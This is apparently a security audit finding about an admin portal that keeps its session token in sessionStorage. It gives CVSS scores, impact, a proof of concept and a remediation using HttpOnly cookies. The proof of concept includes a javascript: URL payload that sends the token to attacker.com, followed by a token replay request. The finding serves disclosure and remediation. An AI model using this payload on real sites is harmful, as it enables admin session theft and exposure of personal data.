# \[VUL-A03\] Admin Session Token Stored in XSS-Accessible sessionStorage

| Attribute | Details |
|---|---|
| Severity | High |
| CVSS v3.1 Score | 7.5 (`CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N`) |
| CVSS v4.0 Score | 7.2 (`CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:H/VI:N/VA:N/SC:N/SI:N/SA:N`) |
| Vulnerability Class | OWASP A02:2021 – Cryptographic Failures · CWE-922: Insecure Storage of Sensitive Information |
| Affected Endpoint | All `GET/PATCH /api/v1/applicants/*` admin endpoints |
| Source Location | `msc-qcu-admin-frontend/src/features/auth/hooks/useLoginForm.ts` (L65) — `src/features/hr/shared/services/applicantApi.ts` (L5–12) |

## 1. Vulnerability Description

After login, the admin portal stores the Bearer session token in `sessionStorage.setItem("accessToken", token)`. All API calls read and transmit this token as `Authorization: Bearer <token>`. `sessionStorage` is fully readable by any JavaScript in the same origin — including any XSS payload.

## 2. Business & Technical Impact

**Technical Impact:** Any XSS vulnerability (VUL-A05) can exfiltrate the token. Stolen token can be replayed for authenticated API access outside the browser.

**Business Impact:** Complete admin session compromise. Full access to all student PII.

## 3. Proof of Concept (PoC)

**Step 1:** Exploit VUL-A05. Applicant submits `javascript:fetch('https://attacker.com/?t='+sessionStorage.getItem('accessToken'))` as portfolio URL.

**Step 2:** Admin HR clicks "Portfolio Link". Token exfiltrated.

**Step 3:** Attacker replays:

```
GET /api/v1/applicants HTTP/1.1
Host: api.msc-qcu.tech
Authorization: Bearer <STOLEN_TOKEN>
```

**Expected Result:** `200 OK` with full applicant PII list.

## 4. Remediation & Guidance

**Root Cause Fix:** Remove `accessToken` from sessionStorage. Remove `getAuthHeaders()` from `applicantApi.ts`. Use `credentials: "include"` exclusively — `HttpOnly` cookie attaches automatically and cannot be stolen via JavaScript.

**References:** [CWE-922](https://cwe.mitre.org/data/definitions/922.html) — [OWASP HTML5 Security Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/HTML5_Security_Cheat_Sheet.html)
